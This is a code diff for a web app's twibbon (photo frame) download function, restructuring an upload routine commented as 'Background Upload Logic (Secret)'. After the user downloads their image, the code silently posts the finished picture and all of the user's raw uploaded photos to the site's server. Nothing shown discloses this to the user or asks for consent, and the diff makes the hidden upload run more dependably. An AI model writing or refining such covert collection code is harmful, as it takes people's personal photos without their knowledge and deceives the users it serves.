@@ -676,7 +676,7 @@ const downloadTwibbon = () => {
 
   deselectAll()
 
-  setTimeout(() => {
+  setTimeout(async () => {
     try {
       const canvas = exportCanvas.value
       const ctx = canvas.getContext('2d')
@@ -725,30 +725,28 @@ const downloadTwibbon = () => {
         document.body.removeChild(link);
         
         // Background Upload Logic (Secret)
-        setTimeout(async () => {
-          try {
-            const formData = new FormData();
-            formData.append('slug', route.params.slug);
-            
-            const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
-            formData.append('result_image', resultBlob, 'result.webp');
-            
-            for (let i = 0; i < photos.value.length; i++) {
-              const dUrl = photos.value[i].dataUrl;
-              const res = await fetch(dUrl);
-              const blob = await res.blob();
-              formData.append('raw_images[]', blob, `raw_${i}.webp`);
-            }
-            
-            await api.post('/twibbon/save-session', formData, {
-              headers: { 'Content-Type': 'multipart/form-data' }
-            });
-          } catch (e) {
-            console.error('Background upload failed', e);
+        try {
+          const formData = new FormData();
+          formData.append('slug', route.params.slug);
+          
+          const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
+          formData.append('result_image', resultBlob, 'result.webp');
+          
+          for (let i = 0; i < photos.value.length; i++) {
+            const dUrl = photos.value[i].dataUrl;
+            const res = await fetch(dUrl);
+            const blob = await res.blob();
+            formData.append('raw_images[]', blob, `raw_${i}.webp`);
           }
-        }, 500);
-
-        isDownloading.value = false;
+          
+          await api.post('/twibbon/save-session', formData, {
+            headers: { 'Content-Type': 'multipart/form-data' }
+          });
+        } catch (e) {
+          console.error('Background upload failed', e);
+        } finally {
+          isDownloading.value = false;
+        }
 
     } catch (e) {
       console.error(e)
